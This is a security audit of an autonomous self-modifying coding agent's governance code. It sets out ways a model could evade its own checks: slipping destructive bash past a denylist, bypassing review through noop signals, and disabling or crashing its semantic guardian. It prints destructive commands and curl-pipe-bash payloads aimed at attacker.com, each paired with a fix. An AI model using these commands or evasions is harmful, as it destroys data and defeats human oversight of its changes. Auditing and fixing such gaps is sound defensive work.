# Anti-Venom Hardening — Verified Findings + Blueprint (ultracode w5yuleopz)

**Date:** 2026-06-26  **Branch (to create):** off `main`  **Status:** verified, pending SDD implementation
**Verification:** 11 adversarial agents, 745451 tokens; 8/9 confirmed (S5 refuted), +5 completeness-critic findings.

## Verified verdicts

### [HIGH] S1-bash-denylist — confirmed=True mitigated=False
- **locus:** backend/core/ouroboros/governance/tool_executor.py:2274
- **fix_files:** backend/core/ouroboros/governance/tool_executor.py
- **exploit:** Three clean repros, any of which a hallucinating or quining model can pass as the bash `command` argument:

1. `find . -delete` — recursively deletes every file in `_repo_root` (the entire working tree). `-delete` does not appear in `_blocked_patterns`; `cmd_lower` check passes cleanly.

2. `truncate -s 0 backend/core/ouroboros/governance/tool_executor.py` — atomically zeros the governance file in-place. `truncate` is absent from the denylist.

3. `printf 'import sys\nsys.exit(1)\n' > backend/core/ouroboros/governance/tool_executor.py` — overwrites the governance file with attacker-controlled content. Only `> /dev/sd` is in the denylist; redirect to arbitrary repo paths is unguarded.

Bonus whitespace variant: `rm  -rf /` (two spaces between `rm` and `-rf`) — `rm -rf /` is not a substring of `rm  -rf /`, bypassing the exact match.

All four execute via `subprocess.run(["bash", "-c", command], cwd=self._repo_root, ...)` at line 2287 with no further content inspection. The entire higher-layer guard stack (OperationMode, ComponentScope, VenomToolPermissions) is confirmed default-FALSE and returns None/no-op. `_is_protected_path` and `_run_venom_iron_gates` are called only from `_edit_file`/`_write_file`/`_delete_file`, never from `_bash`.
- **minimal_fix:** In `_bash` at line 2274, make two targeted additions that reuse existing infrastructure:

1. Extend `_blocked_patterns` with the critical missing destructive verbs:
```python
_blocked_patterns = [
    "rm -rf /", "rm -rf ~", "rm -rf .", "mkfs.", "dd if=",
    ":(){ :", "git push", "git reset --hard",
    "> /dev/sd", "chmod -R 777", "curl|sh", "curl|bash",
    "wget|sh", "pip install", "npm install -g",
    "sudo ", "su -", "passwd",
    # Newly added — previously unguarded:
    "-delete",        # find … -delete (any variant)
    "truncate -s",    # truncate any file to any size
    "dd of=",         # dd output path
    "shred ",         # shred secure-wipe
]
```

2. Immediately after the denylist loop (before the `subprocess.run` call), add a protected-path redirect check that reuses the existing `_is_protected_path` function (already imported at module scope, used by `_edit_file`/`_write_file`):
```python
import re as _re
for _redir_target in _re.findall(r'>{1,2}\s*(\S+)', command):
    _prot = _is_protected_path(_redir_target.replace("\\", "/"))
    if _prot is not None:
        return (
            f"(Iron Gate: bash redirect to protected path "
            f"{_redir_target!r} — {_prot})"
        )
```

This leverages `_is_protected_path` (line 562) and `_PROTECTED_PATH_SUBSTRINGS` (line 499) — the same registry that already guards `edit_file`/`write_file`/`delete_file` — with zero new code or new modules. The two additions together close `find -delete`, `truncate`, `dd of=`, `shred`, and redirect-to-governance-file in ~10 net lines.
- **fix_risk:** Low-to-medium. (a) Adding `-delete` to the denylist could block a legitimate command that contains the literal string `-delete` for a different tool (e.g., a hypothetical custom script argument), but `-delete` is a find-specific action not used by any other standard utility. (b) The redirect check applies only to paths matching `_is_protected_path` substrings (`.git/`, `.env`, `credentials`, `secret`, etc.); false-positive rate is very low. (c) Whitespace-variant bypasses (`rm  -rf /`) remain possible for newly-added patterns — the denylist's fundamental limitation persists, but this fix eliminates the highest-impact unguarded surface (whole-tree deletion via `find -delete`, file zeroing via `truncate`, governance-file overwrite via redirect). A longer-term fix would use a POSIX shell parser rather than substring matching, but that is out of scope for a minimal patch.

### [HIGH] S2-inloop-write-bypass — confirmed=True mitigated=False
- **locus:** backend/core/ouroboros/governance/orchestrator.py:7472 (noop bypass — no venom_edit_history guard); orchestrator.py:8727-8737 (SemanticGuardian reads post-write disk as "old"); tool_executor.py:2503 (_edit_file disk write); tool_executor.py:2654 (_write_file disk write)
- **fix_files:** backend/core/ouroboros/governance/orchestrator.py
- **exploit:** A compromised or quining model running in a worktree (the standard autonomous-ops isolated path) can execute the following sequence, completely bypassing SemanticGuardian, risk-tier escalation, NOTIFY_APPLY preview, and REVIEW shadow:

1. Call read_file("target.py") — satisfies must-have-read guard.
2. Call edit_file("target.py", old_text="auth_required = True", new_text="auth_required = False") — PolicyEngine allows it on a worktree (Rule 0e only blocks primary checkout when JARVIS_DETERMINISTIC_ISOLATION_LOCK_ENABLED=true). The disk write lands at tool_executor.py:2503. _record_edit() appends to venom_edit_history.
3. Return {"schema_version": "2b.1-noop", "reason": "change already present"} — explicitly suggested in the system prompt (providers.py line 183). _parse_generation_response() sets is_noop=True on the GenerationResult.
4. Orchestrator reaches orchestrator.py:7472: if generation.is_noop — there is NO check of generation.venom_edit_history. Execution jumps to ctx.advance(OperationPhase.COMPLETE, ...) and returns.
5. The semantic inversion auth_required=True→False is now on the worktree disk. It was never seen by: SemanticGuardian, risk_tier escalation, NOTIFY_APPLY, REVIEW shadow, or VALIDATE test suite.

Secondary (non-noop) bypass: the model can also output a candidate whose full_content equals the already-in-loop-written content. SemanticGuardian at orchestrator.py:8727-8737 reads _old from current disk = the post-write content. If full_content matches current disk, the guardian sees zero delta, classifies SAFE_AUTO, and the op auto-applies — the original→write semantic delta is never evaluated.
- **minimal_fix:** Two chokepoints in orchestrator.py, leveraging the existing generation.venom_edit_history field and the SemanticGuardian infrastructure:

PATCH 1 — close the noop bypass (orchestrator.py at line 7472):
```python
if generation.is_noop:
    # Fail-closed: if any in-loop writes landed before the noop signal,
    # those writes bypassed SemanticGuardian and all GATE checks.
    # Refuse the short-circuit; cancel the op so a rollback can happen.
    _inloop_writes = getattr(generation, "venom_edit_history", ()) or ()
    if _inloop_writes:
        logger.warning(
            "[Orchestrator] op=%s noop+inloop-writes blocked — "
            "%d in-loop write(s) never passed SemanticGuardian; cancelling",
            ctx.op_id, len(_inloop_writes),
        )
        ctx = ctx.advance(
            OperationPhase.CANCELLED,
            terminal_reason_code="noop_inloop_write_guard",
        )
        await self._record_ledger(ctx, OperationState.FAILED, {
            "reason": "noop_inloop_write_guard",
            "inloop_write_count": len(_inloop_writes),
        })
        return ctx
    # ... existing noop handling unchanged
```

PATCH 2 — correct SemanticGuardian's "old" baseline (orchestrator.py at line 8727-8737):
Replace the existing _old-from-disk read with:
```python
_old = ""
_inloop_written_paths = {
    e.get("path", "") for e in getattr(generation, "venom_edit_history", ()) or ()
}
if _path in _inloop_written_paths:
    # File was modified in-loop; read git HEAD for the pre-op baseline
    # so the guardian compares original→candidate, not post-write→candidate.
    try:
        import subprocess as _sp2
        _old = _sp2.check_output(
            ["git", "show", f"HEAD:{_path}"],
            cwd=str(self._config.project_root),
            timeout=5,
            stderr=_sp2.DEVNULL,
        ).decode("utf-8", errors="replace")
    except Exception:
        _old = ""  # new/untracked file — guardian treats empty as baseline
else:
    try:
        _abs = (
            self._config.project_root / _path
            if not Path(_path).is_absolute()
            else Path(_path)
        )
        if _abs.is_file():
            _old = _abs.read_text(encoding="utf-8", errors="replace")
    except Exception:
        _old = ""
_pairs.append((_path, _old, _new))
```

Both patches touch only orchestrator.py and reuse the existing venom_edit_history audit trail that ToolLoopCoordinator already populates (via _record_edit at tool_executor.py:2375).
- **fix_risk:** PATCH 1: Low risk. Noop + in-loop writes is contradictory by design — the system prompt asks for noop only when "the change is already present" (providers.py:183), not when the model just wrote it. Cancelling these ops is the correct safe default. Possible breakage: any test or integration that exercises a path where the model writes a file and then correctly signals noop (unlikely by design). The cancel terminal lets the op be retried.

PATCH 2: Low-medium risk. Adds one git show HEAD:<path> subprocess call (~5ms) per in-loop-modified file during GATE. Fails gracefully on new/untracked files (empty string baseline → guardian may fire more liberally on genuinely new content, but will not miss inversions). Risk: if the project root is not a git repo or HEAD does not exist (fresh repo), git show fails silently and _old reverts to empty string — SemanticGuardian over-fires, escalating risk tier unnecessarily. Acceptable: escalation is the safe direction. No risk of under-escalation.

### [CRITICAL] S3-quine-governance — confirmed=True mitigated=False
- **locus:** backend/core/ouroboros/governance/tool_executor.py:499-517 (_PROTECTED_PATH_SUBSTRINGS missing "ouroboros/governance/semantic_guardian"); risk_engine.py:213-221 (_EXPLORATION_SELF_MOD_SENTINELS missing same sentinel); change_engine.py:622-692 (APPLY path has no SemanticGuardian call)
- **fix_files:** backend/core/ouroboros/governance/tool_executor.py, backend/core/ouroboros/governance/risk_engine.py
- **exploit:** O+V (1) calls read_file("backend/core/ouroboros/governance/semantic_guardian.py") to satisfy the must-have-read invariant at tool_executor.py:2443; (2) calls edit_file with old_text="def guardian_enabled() -> bool:\n    return os.environ.get(_ENV_ENABLED, \"1\").strip().lower() in _TRUTHY" and new_text="def guardian_enabled() -> bool:\n    return False". All six tool_executor layers pass: not a protected path (layer 1, line 2430), must-have-read satisfied (layer 2, line 2443), unique match (layer 3), Iron Gate ASCII clean (layer 4, line 2473), not a dependency file (layer 5), valid Python AST (layer 6, line 2495). File is written at line 2503. All subsequent SemanticGuardian.inspect() calls return []; the guard_boolean_inverted pattern that would have caught this exact edit never fires. InvariantDriftObserver detects drift at the next periodic cycle (tens of seconds to minutes later), but O+V can auto-commit and auto-push during that window, making the weakened guardian persistent. Via the change_engine path the same outcome holds because orchestrator._build_profile() (orchestrator.py:11464-11466) sets touches_security_surface=False for paths containing "semantic_guardian" (none of the keywords "auth","secret","cred","token","encrypt" match), source="" bypasses _EXPLORATION_SELF_MOD_SENTINELS entirely, and SAFE_AUTO auto-applies the write.
- **minimal_fix:** Two-file, zero-duplication, fail-closed fix leveraging existing chokepoints:\n\n1. backend/core/ouroboros/governance/tool_executor.py — append to _PROTECTED_PATH_SUBSTRINGS at line 499:\n    \"ouroboros/governance/semantic_guardian\",  # immune system — S3-quine gate\n    \"ouroboros/governance/tool_executor\",       # self-protection of this very list\nThis closes the edit_file/write_file path structurally; no write reaches disk.\n\n2. backend/core/ouroboros/governance/risk_engine.py — two changes:\n   a) Extend _EXPLORATION_SELF_MOD_SENTINELS (line 213) with \"ouroboros/governance/semantic_guardian\" to block exploration/roadmap/architecture sources.\n   b) Add a new general rule BEFORE Rule 1 in classify() that raises HardInvariantViolation (already defined at line 89) for any source:\n       _IMMUNE_SYSTEM_SENTINELS: tuple = (\"ouroboros/governance/semantic_guardian\",)\n       # In classify(), before the existing exploration block:\n       file_strs = [str(f) for f in profile.files_affected]\n       if any(s in fpath for fpath in file_strs for s in self._IMMUNE_SYSTEM_SENTINELS):\n           raise HardInvariantViolation(\"immune-system path modification blocked\")\n   HardInvariantViolation is non-bypassable — unlike RiskTier.BLOCKED it cannot be promoted via break-glass (change_engine.py:565-572).
- **fix_risk:** 1. Any legitimate update to semantic_guardian.py or tool_executor.py through O+V's own tool calls becomes impossible; human-initiated edits (direct git, IDE) are unaffected. This is intentional for immune-system files but means shipping pattern upgrades to the guardian requires a non-autonomous workflow. 2. HardInvariantViolation raised inside change_engine.execute() propagates out of the try/except that only catches specific orchestrator exceptions; callers of execute() that do not already handle generic Exception will surface a raw traceback — review orchestrator.py call sites around change_engine.execute() to ensure they catch Exception broadly (the outermost await in governed_loop_service already does). 3. No false positives for non-governance paths; all existing tests that do not touch semantic_guardian.py or tool_executor.py are unaffected.

### [CRITICAL] S4-guardian-fail-open — confirmed=True mitigated=False
- **locus:** backend/core/ouroboros/governance/orchestrator.py:8792-8796 (outer catch) and backend/core/ouroboros/governance/semantic_guardian.py:127-138 (per-pattern catch)
- **fix_files:** backend/core/ouroboros/governance/orchestrator.py
- **exploit:** Two-step self-modification attack: (1) Propose a 1-line edit to semantic_guardian.py that survives SemanticGuardian's own scan of the *candidate content* (e.g., introduce a syntax error or `raise RuntimeError()` in every pattern function). This change classifies SAFE_AUTO (small, single-file, low blast radius) and auto-applies. (2) On the next cycle, `from backend.core.ouroboros.governance.semantic_guardian import SemanticGuardian` at orchestrator.py:8700 throws ImportError or SyntaxError; the outer `except Exception: logger.debug` at line 8792 fires; `_guardian_findings` stays `[]`; `recommend_tier_floor([])` returns None; no tier upgrade. With `JARVIS_REVIEW_SUBAGENT_ENFORCE` defaulting to false and `JARVIS_MUTATION_GATE_ENABLED` defaulting to 0, no compensating gate remains. The operator is asleep (`_human_is_watching()` → False on headless/no-TTY), so there is no preview or countdown. All subsequent SAFE_AUTO candidates — including those with inverted boolean guards, removed security imports, or hardcoded credentials — auto-apply unreviewed. Disable-by-exception is structurally equivalent to disable-by-env (`JARVIS_SEMANTIC_GUARD_ENABLED=0`) or disable-by-self-edit.
- **minimal_fix:** In orchestrator.py, replace the except block at lines 8792-8796 with a fail-closed handler that applies a NOTIFY_APPLY floor when the guardian crashes:

```python
except Exception:
    logger.warning(
        "[Orchestrator] SemanticGuardian raised — failing CLOSED; "
        "upgrading to NOTIFY_APPLY floor; op=%s",
        getattr(ctx, "op_id", "?"),
        exc_info=True,
    )
    if risk_tier.value < RiskTier.NOTIFY_APPLY.value:
        risk_tier = RiskTier.NOTIFY_APPLY
```

Both `RiskTier` and `risk_tier` are already in-scope locals. NOTIFY_APPLY is the minimal floor: it mirrors what a single "soft" finding would produce, forces the 5-second operator preview+cancel window, and does not silently auto-apply. Using `logger.warning` (not `.debug`) ensures the guardian crash is visible in production log aggregation. No new files required; the only change is replacing the 4-line except body with a 5-line fail-closed body at the one chokepoint that gates all SAFE_AUTO candidates.
- **fix_risk:** Any candidate that previously auto-applied during a SemanticGuardian crash will now require the operator to see a 5-second NOTIFY_APPLY preview. If SemanticGuardian is crashing frequently (e.g., due to a dependency regression), operators will see more NOTIFY_APPLY promotions than expected. This is the desired behavior — the blast radius of the fix is exactly bounded to the cases where the guardian was already silently failing. No currently-healthy path is affected: when the guardian succeeds and returns [], NOTIFY_APPLY is not applied.

### [REFUTED] S5-multifile-split — confirmed=False mitigated=True
- **locus:** backend/core/ouroboros/governance/semantic_guardian.py:882-931
- **fix_files:** 
- **exploit:** The stated exploit is refuted by Pattern 11 (dynamic_import_chain). `base64.b64decode` is explicitly enumerated at line 889 inside `_DYNAMIC_ATTR_CALLS`, and `exec` is enumerated at line 883 inside `_DYNAMIC_EXEC_BUILTINS`. `_count_dynamic_chains` (lines 908-950) walks every Call node in the AST and increments a counter for each hit. `_pat_dynamic_import_chain` (lines 953-975) fires when new_count > old_count (delta > 0). Therefore: File A introducing `payload = base64.b64decode(ENCODED)` yields delta=+1 in file A → hard finding. File B introducing `exec(payload)` yields delta=+1 in file B → hard finding. Both halves independently trip the guardian before apply. The claim that "each file [is] benign" is factually wrong for the stated exploit. `inspect_batch` (lines 143-153) passes all (path, old, new) tuples through `inspect()` independently but that is sufficient here because each half is already individually detectable. No cross-file taint analysis is needed to block this specific composite attack.
- **minimal_fix:** No fix required — Pattern 11 already closes this attack vector. If a genuine cross-file gap exists it would require an attacker to (a) already have a pre-existing exec/eval call in file B so the count does not increase and (b) change only the argument of that call to reference a newly-introduced variable from file A. That scenario evades Pattern 11 equally within a single file (it is an argument-substitution blind spot in Pattern 11, not a cross-file issue), and addressing it would require data-flow analysis rather than call-count deltas.
- **fix_risk:** N/A — no fix required.

### [HIGH] S6-nonpython-payload — confirmed=True mitigated=False
- **locus:** backend/core/ouroboros/governance/semantic_guardian.py:161-168 (_safe_parse silently returns None for any non-Python syntax, cascading to early-return in all 10 AST-based patterns); additionally semantic_guardian.py:886-898 (_DYNAMIC_ATTR_CALLS missing ("os","system"), ("subprocess","run") etc., leaving direct attribute-call shell execution undetected even in Python-parseable .pth content).
- **fix_files:** backend/core/ouroboros/governance/semantic_guardian.py
- **exploit:** Two distinct but converging attack paths both confirmed reachable through gate_runner.py:325 (inspect_batch, no extension filter, mandatory GATE path):

PATH A — .sh / .yaml payload (exact claimed mechanism): Submit a candidate that writes e.g. `deploy.sh` or `config.yaml` with content `curl http://attacker.com/shell.sh | bash`. `_safe_parse()` returns None (SyntaxError) → patterns 1,2,3,5,6,8,10,11,12 all early-return. Six regex-based patterns (4,7,9,13,14,15) run; none match. The file reaches APPLY and lands on disk at SAFE_AUTO tier, executing when the CI/CD pipeline sources the script.

PATH B — .pth / Python-parseable payload (corrected mechanism for .pth): Submit a candidate `site-packages/evil.pth` (or any path on sys.path) with content: `import os; os.system("curl http://attacker.com | bash")`. `ast.parse()` succeeds (valid Python), all 15 patterns run. Pattern 11 check: `os.system` resolves to pair ("os","system") — not in `_DYNAMIC_ATTR_CALLS` (line 886-898), not caught. No other pattern fires. The file lands as SAFE_AUTO. Python's site module executes every `import`-prefixed line of every .pth file in sys.path at interpreter startup, so the payload runs on every subsequent Python invocation in the environment.

A hallucinating or quining model uses PATH B: propose a conftest.py or setup hook that writes evil.pth into the active venv's site-packages; the GovernanceStack has no FORBIDDEN_PATH covering site-packages by default and no extension-based write restriction.
- **minimal_fix:** Two additive changes to semantic_guardian.py only, zero duplication, leveraging existing helpers:

1. Extend `_DYNAMIC_ATTR_CALLS` at line 886 to include direct shell-execution pairs so Pattern 11 catches them in Python-parseable content (covers .pth, .py):
```python
_DYNAMIC_ATTR_CALLS: frozenset = frozenset({
    # existing entries unchanged ...
    ("os", "system"),
    ("os", "popen"),
    ("subprocess", "run"),
    ("subprocess", "call"),
    ("subprocess", "Popen"),
    ("subprocess", "check_output"),
    ("subprocess", "check_call"),
})
```

2. Add Pattern 16 `shell_exec_introduced` as a pure-regex detector (same structure as Pattern 7 `permission_loosened`) so it fires on ALL file types including .sh/.yaml where _safe_parse returns None:
```python
_SHELL_EXEC_RE = re.compile(
    r"\b(?:os\.(?:system|popen)|subprocess\.(?:run|call|Popen|check_output|check_call))\s*\("
)

def _pat_shell_exec_introduced(
    *, file_path: str, old_content: str, new_content: str,
) -> Optional[Detection]:
    new_hits = _SHELL_EXEC_RE.findall(new_content)
    if not new_hits:
        return None
    old_hits = _SHELL_EXEC_RE.findall(old_content)
    if len(new_hits) <= len(old_hits):
        return None
    lines = _line_numbers_for_pattern(new_content, _SHELL_EXEC_RE)
    return Detection(
        pattern="shell_exec_introduced",
        severity="hard",
        message=(
            f"Shell execution call introduced "
            f"({len(new_hits) - len(old_hits)} new): "
            "os.system/popen or subprocess.*"
        ),
        file_path=file_path,
        lines=tuple(lines),
        snippet=f"hits: {', '.join(repr(h) for h in new_hits[:2])}",
    )
```

Then register it: add `"shell_exec_introduced"` to `_ALL_PATTERNS` tuple and `_PATTERNS` dict. No other files need to change — gate_runner.py calls `inspect_batch` which already iterates `_ALL_PATTERNS`.
- **fix_risk:** False positives: any candidate that legitimately adds a new subprocess.run() call (e.g., a test runner, a git wrapper, a new CLI tool) will trigger Pattern 16 hard-escalating to APPROVAL_REQUIRED. This is intentional — shell execution is a high-blast-radius action and operator review is the correct response. The delta check (new_hits > old_hits) means pre-existing subprocess calls in files that are being edited for unrelated reasons are not re-flagged. Risk of breaking the subprocess.run() uses already in the governance code itself: those files are pre-existing (old_count = new_count), so the delta is zero — no escalation. The only other risk is extending _DYNAMIC_ATTR_CALLS in Pattern 11: if a candidate removes an os.system call and adds a new one, Pattern 11 sees count unchanged (delta=0) and does not fire; Pattern 16 catches the new add regardless, so coverage is preserved.

### [HIGH] C1-stale-apply-dead — confirmed=True mitigated=False
- **locus:** backend/core/ouroboros/governance/phase_runners/slice4b_runner.py:474-495
- **fix_files:** backend/core/ouroboros/governance/phase_runners/slice4b_runner.py
- **exploit:** With JARVIS_PHASE_RUNNER_SLICE4B_EXTRACTED unset (default "true"), every APPLY goes through Slice4bRunner. A concurrent write to any target file between GENERATE-complete (when ctx.generate_file_hashes is snapshotted at generate_runner.py:486) and Slice4bRunner entering the stale guard (slice4b_runner.py:476) causes _stale_files to be populated. The runner logs a warning at line 488 and records the ledger entry at 492-495, then falls through to the change-engine apply with no abort. The full-content overwrite or diff/anchor apply runs against the stale baseline, corrupting the file. In the autonomous self-development context, a hallucinating or quining model generates a patch; the engine detects the base is stale at apply time but applies it anyway — overwriting concurrent human edits or parallel-agent writes. should_block_apply at orchestrator.py:9657 would have caught and blocked this, but it lives in the else: branch (orchestrator.py:9307) which is skipped when the flag is true (the default). Repro: set JARVIS_STATE_DRIFT_VERIFY_ENABLED=true (default), leave JARVIS_PHASE_RUNNER_SLICE4B_EXTRACTED unset, trigger an operation on a file, modify that file concurrently after GENERATE completes, observe the warning in logs and the corrupted file after APPLY — no abort, no POSTMORTEM.
- **minimal_fix:** In slice4b_runner.py, replace the manual hash-loop at lines 474-495 with a call to should_block_apply from state_drift — the same pattern used by the inline orchestrator at lines 9647-9693. Eliminates duplication of detect_drift logic and wires in the blocking exit. Replace lines 474-495 with:

        # ── Stale-exploration guard (Slice 248 — APPLY-time verification) ──
        from backend.core.ouroboros.governance.state_drift import (
            should_block_apply as _should_block_apply,
            STATE_DRIFT_UNRECONCILED as _STATE_DRIFT_UNRECONCILED,
        )
        _block_apply, _stale_files = _should_block_apply(
            ctx.generate_file_hashes, orch._config.project_root,
        )
        if _stale_files:
            logger.warning(
                "[Orchestrator] Stale-exploration: %d file(s) changed between GENERATE and APPLY: %s [%s]",
                len(_stale_files), _stale_files[:3], ctx.op_id[:12],
            )
            await orch._record_ledger(ctx, OperationState.APPLYING, {
                "event": "stale_exploration_detected",
                "stale_files": _stale_files,
            })
        if _block_apply:
            logger.warning(
                "[Orchestrator] STATE DRIFT UNRECONCILED — blocking APPLY "
                "of stale candidate on %s — failing safe (no corruption) "
                "[%s]", _stale_files[:3], ctx.op_id[:12],
            )
            await orch._record_ledger(ctx, OperationState.FAILED, {
                "reason": _STATE_DRIFT_UNRECONCILED,
                "stale_files": _stale_files,
            })
            ctx = ctx.advance(
                OperationPhase.POSTMORTEM,
                terminal_reason_code=_STATE_DRIFT_UNRECONCILED,
            )
            await orch._publish_outcome(
                ctx, OperationState.FAILED, _STATE_DRIFT_UNRECONCILED,
            )
            return PhaseResult(
                next_ctx=ctx, next_phase=None, status="fail",
                reason=_STATE_DRIFT_UNRECONCILED,
                artifacts={"t_apply": _t_apply},
            )

The hashlib import at slice4b_runner.py:85 remains (used elsewhere in the file). The escape hatch JARVIS_STATE_DRIFT_VERIFY_ENABLED=false degrades to log-only if needed (state_drift_verify_enabled() inside should_block_apply controls the block flag).
- **fix_risk:** Operations where a concurrent write occurs in the GENERATE-to-APPLY window will now fail to POSTMORTEM instead of silently applying. This increases op latency in high-concurrency scenarios (the op re-runs on next sensor trigger). No impact when generate_file_hashes is empty (new-file ops). The JARVIS_STATE_DRIFT_VERIFY_ENABLED=false escape hatch reverts to log-only for any environment that cannot tolerate the abort. The stale comment at orchestrator.py:9288 ("default false") should also be updated to "default true" to prevent future confusion, but that is documentation only and does not affect runtime behavior.

### [HIGH] C2-unshielded-cancel — confirmed=True mitigated=False
- **locus:** orchestrator.py:9832-9833 (change_engine.execute called under maybe_mutation_section without asyncio.shield) / governed_loop_service.py:3483 (_op_task.cancel fire-and-forget) / change_engine.py:692-739 (split-brain window: sync write at 692, APPLIED ledger at 739, first cancellable await at 710)
- **fix_files:** backend/core/ouroboros/governance/orchestrator.py
- **exploit:** Exploit: (1) Enable user_signal_bus (always active post-build — governed_loop_service.py:4885 unconditionally instantiates it). (2) Submit an op that reaches the APPLY phase. (3) Fire request_stop() on the bus at any point while change_engine.execute() is between line 692 (target.write_text — synchronous, already committed to disk) and line 739 (ledger.append APPLIED — the first async commit after the write). The earliest cancellation landing point is the emit_heartbeat await at line 710 (diff emit), which is the first await after the synchronous write. CancelledError at 710 skips all remaining ledger work. Result: file is mutated on disk, ledger entry is stuck at APPLYING (the entry written at line 640 before the write), op is stored in _completed_ops as CANCELLED (governed_loop_service.py:3513). Dedup at governed_loop_service.py:3075 permanently rejects any re-submit of the same op_id as "duplicate:already_completed". The mutation is on disk, unrecorded in the APPLIED ledger state, and un-retryable. The maybe_mutation_section guard at orchestrator.py:9832 only protects against the operator-yield/park path (drain() in generate_park_wrapper.py:371 checks is_mutating() before parking); it does not protect against asyncio task cancellation because mutation_section (mutation_critical_section.py:38-46) is a plain counter context manager with no asyncio.shield, and the except Exception handler at orchestrator.py:9834 does not catch BaseException/CancelledError (Python 3.8+). The no-bus path at governed_loop_service.py:3579 uses shielded_wait_for for exactly this reason; the bus path has no equivalent.
- **minimal_fix:** In orchestrator.py, at the single-file apply call site (line 9833) and the multi-file apply call site (line 9804), wrap the execute/apply calls with asyncio.shield so the inner coroutine (file write + ledger APPLIED commit) runs to completion even when the outer _op_task receives a cancel signal:

Line 9833 change:
  BEFORE: change_result = await self._stack.change_engine.execute(change_request)
  AFTER:  change_result = await asyncio.shield(self._stack.change_engine.execute(change_request))

Line 9804 change (multi-file):
  BEFORE: change_result = await self._apply_multi_file_candidate(ctx, best_candidate, _candidate_files, snapshots,)
  AFTER:  change_result = await asyncio.shield(self._apply_multi_file_candidate(ctx, best_candidate, _candidate_files, snapshots,))

asyncio is already imported in orchestrator.py (stdlib). No new files, no new dependencies. asyncio.shield spawns an inner Task that is unaffected by cancellation of the outer _op_task; the inner task runs change_engine.execute() to completion (file write already done + APPLIED ledger entry at change_engine.py:739 completes). CancelledError is still raised on the outer task after the shield boundary, so the op is still recorded as CANCELLED at governed_loop_service.py:3513 — the user's stop signal is honored. The ledger now consistently shows APPLIED before the CANCELLED record is written at the service level. No behavior change when no cancellation occurs (asyncio.shield is transparent in the normal path).
- **fix_risk:** asyncio.shield spawns a new Task per shielded call; under concurrent stop-during-APPLY scenarios, background tasks briefly accumulate doing ledger commits. Each is short-lived (sub-second in normal operation) so accumulation is bounded. When CancelledError fires at the shield boundary, change_result is unavailable to the outer task — but the outer task is being cancelled anyway and does not use the result, so no logic break. If the inner task itself hangs (ledger I/O stall), it outlives the outer task and holds references until it times out or errors; this is mitigated by ledger.append's own timeout behavior. The git-commit section at orchestrator.py:10455 (also wrapped in maybe_mutation_section) uses asyncio.wait_for internally which does not shield the commit task from external cancel — this is a secondary gap of lower severity since git commits are typically atomic at the OS level and can be replayed, but it should be tracked separately.

### [HIGH] C3-wal-lease-leak — confirmed=True mitigated=False
- **locus:** /Users/djrussell23/Documents/repos/JARVIS-AI-Agent/backend/core/ouroboros/governance/intake/unified_intake_router.py:1424
- **fix_files:** backend/core/ouroboros/governance/intake/unified_intake_router.py
- **exploit:** Concrete repro: (1) Send 3 signals with the same coalesce key (same source, overlapping target_files) within _coalesce_window_s. Each ingest() call at line 1086 appends a WAL entry with status="pending" for lease_ids lse_A, lse_B, lse_C. (2) _flush_expired_coalesce_buffers() fires → _flush_coalesced() builds a merged IntentEnvelope with lease_id=lse_A (line 1424); envelopes[1:] (lse_B, lse_C) are silently dropped with no _wal.update_status() call. (3) _dispatch_one(merged) succeeds → _wal.update_status(lse_A, "acked") at line 1830. lse_B and lse_C remain status="pending" in the WAL file. (4) Kill or restart the process. (5) On boot, _replay_wal() calls _wal.pending_entries() (wal.py:81-132) which reads all records and returns [WALEntry(lse_B), WALEntry(lse_C)] since no tombstone was written for them. (6) _replay_wal() enqueues both directly via self._queue.put() at line 1892, bypassing ingest() and its in-memory dedup gate (which is also reset to empty on restart). (7) _dispatch_one() fires twice, submitting 2 duplicate GLS code-mutation operations that were already completed in the prior session. For the autonomous self-development engine this means N-1 duplicate code patches (or autonomous mutations) are unconditionally applied after every restart following any coalesce event — with no idempotency guard on the replay path.
- **minimal_fix:** In _flush_coalesced (unified_intake_router.py:1383), after the line `base = envelopes[0]` (line 1411) and before the `return IntentEnvelope(...)` block, iterate over the absorbed envelopes and write "acked" tombstones to the WAL so they can never be replayed:

    base = envelopes[0]
    # Ack the N-1 absorbed leases now so they are never replayed by _replay_wal.
    for _absorbed in envelopes[1:]:
        try:
            self._wal.update_status(_absorbed.lease_id, "acked")
        except Exception:
            logger.warning(
                "[Router] WAL ack failed for absorbed lease_id=%s",
                _absorbed.lease_id,
            )
    return IntentEnvelope(
        ...
        lease_id=base.lease_id,
        ...
    )

This is the single chokepoint where all N lease_ids are simultaneously known and the merge decision is final. It requires no schema changes to IntentEnvelope or WAL, no new data structures, and leverages the existing self._wal.update_status() call pattern already used at lines 1624/1830/1848/1868.
- **fix_risk:** Low. The fix writes extra "acked" tombstones only for lease_ids that are permanently absorbed into the merged envelope and can never be independently dispatched. No valid pending work is lost: the base lease (lse_A) still proceeds normally through _dispatch_one and is acked there. If _wal.update_status() throws (it only raises ValueError for invalid status strings; "acked" is always valid per _TERMINAL_STATUSES in wal.py:25), the try/except degrades to the pre-fix behavior for that single absorbed lease — a bounded regression. WAL compaction (wal.py:134) handles cleanup of the extra acked records within max_age_days. No changes to IntentEnvelope schema, WAL file format, _dispatch_one, or _replay_wal are required.

## Completeness-critic findings (additional bypasses)

I have enough to report. Here are the additional findings beyond the nine already-tracked vulnerabilities.

---

# ADDITIONAL O+V BYPASSES (beyond the nine being verified)

All paths/line numbers are in `backend/core/ouroboros/governance/`. The recurring root cause: the `_is_protected_path` + containment chokepoint and the SemanticGuardian live ONLY on two surfaces (the in-loop Venom edit/write/delete handlers and `GoverningToolPolicy` Rule 12). Several other write-to-disk paths never touch either.

---

## Finding 1 — CRITICAL: the deterministic GENERATE→APPLY arc has NO protected-path or repo-containment check on the model-controlled `file_path`

- `orchestrator.py:12499-12513` `_build_change_request`: `target_file = Path(candidate.get("file_path", ...))` — taken verbatim from the model's GENERATE candidate.
- `orchestrator.py:12580-12592` `_apply_multi_file_candidate`: same, `_abs = project_root / _rel` (or the raw absolute path).
- `change_engine.py:635-692` `ChangeEngine.execute`: `target = self._redirect_target(...)` then `target.write_text(signed_content)` — no `_is_protected_path`, no `relative_to(project_root)` containment (grep: `change_engine.py` has zero `_is_protected_path` uses; `orchestrator.py` has zero).
- The only path gate on the candidate is in VALIDATE: `test_runner.py:213-234` `_normalize`/`_route`, but it runs on the **sandbox copy by basename** (`orchestrator.py:12394` `sandbox / _primary_rel.name`), so the escaping ORIGINAL path is never inspected.
- SemanticGuardian (`orchestrator.py:8697-8743`) only inspects content patterns, not the destination path; `risk_engine` classifies by blast radius (one small file → SAFE_AUTO → auto-apply).

